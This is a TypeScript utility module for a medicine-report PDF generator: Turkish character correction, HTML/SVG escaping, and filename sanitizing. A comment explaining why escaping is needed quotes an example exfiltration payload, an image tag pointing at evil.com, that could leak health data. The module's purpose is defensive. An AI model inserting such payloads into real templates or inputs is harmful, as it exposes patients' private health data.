/**
 * pdfReportService — pure text + escape helpers.
 *
 * Sprint 9.4: pdfReportService.ts (524 satir) pure helper'lari
 * pure modulde — I/O bagimliligi olmadan test edilebilir.
 */

/**
 * Unicode escape sequence'lari decode et (\\u00fc -> u).
 */
export function decodeUnicodeEscapes(str: string): string {
  if (!str) return str;
  return str.replace(/\\u([0-9a-fA-F]{4})/g, (_, code) => String.fromCharCode(parseInt(code, 16)));
}

/**
 * Turkce karakter duzeltme mapping (API'lerden gelen ASCII metinleri
 * duzeltmek icin).
 */
export const TURKISH_CORRECTIONS: Record<string, string> = {
  GOZ: 'GÖZ',
  SURUP: 'ŞURUP',
  KAPSUL: 'KAPSÜL',
  SUSPANSIYON: 'SÜSPANSİYON',
  EMULSIYON: 'EMÜLSİYON',
  FITIL: 'FİTİL',
  SASE: 'SAŞE',
  GRANUL: 'GRANÜL',
  COZUCU: 'ÇÖZÜCÜ',
  COZELTI: 'ÇÖZELTİ',
  ENJEKSIYON: 'ENJEKSİYON',
  INHALER: 'İNHALER',
  ILAC: 'İLAÇ',
  OZEL: 'ÖZEL',
  URUN: 'ÜRÜN',
  ICIN: 'İÇİN',
  AGIZ: 'AĞIZ',
  TOPIKAL: 'TOPİKAL',
  OFTALMIK: 'OFTALMİK',
  goz: 'göz',
  surup: 'şurup',
  kapsul: 'kapsül',
  suspansiyon: 'süspansiyon',
  emulsiyon: 'emülsiyon',
  sase: 'saşe',
  granul: 'granül',
  cozucu: 'çözücü',
  cozelti: 'çözelti',
  ilac: 'ilaç',
  ozel: 'özel',
  urun: 'ürün',
  icin: 'için',
  agiz: 'ağız',
};

/**
 * Turkce karakter duzeltmeleri uygula (Türkçe ASCII -> UTF-8).
 * Kelime sinirina saygi gosterir (\\b).
 */
export function fixTurkishCharacters(text: string): string {
  if (!text) return text;
  let result = decodeUnicodeEscapes(text);
  for (const [wrong, correct] of Object.entries(TURKISH_CORRECTIONS)) {
    const regex = new RegExp(`\\b${wrong}\\b`, 'g');
    result = result.replace(regex, correct);
  }
  return result;
}

/**
 * HTML/SVG metin icerigi icin escape. Kullanici girdisi (med.name, dosage, note)
 * dogrudan template icine yerlestirildiginde XSS / PHI exfiltrasyon riski olusturur.
 * react-native-html-to-pdf arka planda HTML/SVG parser calistirdigindan
 * <image href="http://evil.com/..."> gibi payload'lar saglik verisi sizintisina yol acabilir.
 */
export function escapeHtml(text: string | null | undefined): string {
  if (text == null) return '';
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

/**
 * SVG <text> elementi icin ek guvenlik: yeni satirlari bosluga cevirir,
 * boylece cizgi baslangici komutlari (orn. </text> ile erken kapatma) engellenir.
 */
export function escapeSvgText(text: string | null | undefined): string {
  return escapeHtml(text).replace(/[\r\n]+/g, ' ');
}

/**
 * PDF icin guvenli dosya adi olustur. Turkce karakterler ASCII'ye
 * donusturulur (browser/PDF viewer uyumlulugu icin).
 */
export function sanitizeFilename(name: string): string {
  if (!name) return 'medicine-report';
  return name
    .replace(/[ğĞ]/g, 'g')
    .replace(/[üÜ]/g, 'u')
    .replace(/[şŞ]/g, 's')
    .replace(/[ıİ]/g, 'i')
    .replace(/[öÖ]/g, 'o')
    .replace(/[çÇ]/g, 'c')
    .replace(/[^a-zA-Z0-9-_\s]/g, '')
    .replace(/\s+/g, '-')
    .toLowerCase()
    .substring(0, 100); // Max 100 char
}

/**
 * Tarih araligi iceren dosya adi olustur (rapor icin).
 */
export function buildReportFilename(
  medicineName: string,
  days: number,
  language: 'tr' | 'en' = 'tr'
): string {
  const safeName = sanitizeFilename(medicineName);
  const date = new Date().toISOString().split('T')[0]; // YYYY-MM-DD
  if (language === 'tr') {
    return `${safeName}-rapor-${days}gun-${date}.pdf`;
  }
  return `${safeName}-report-${days}days-${date}.pdf`;
}
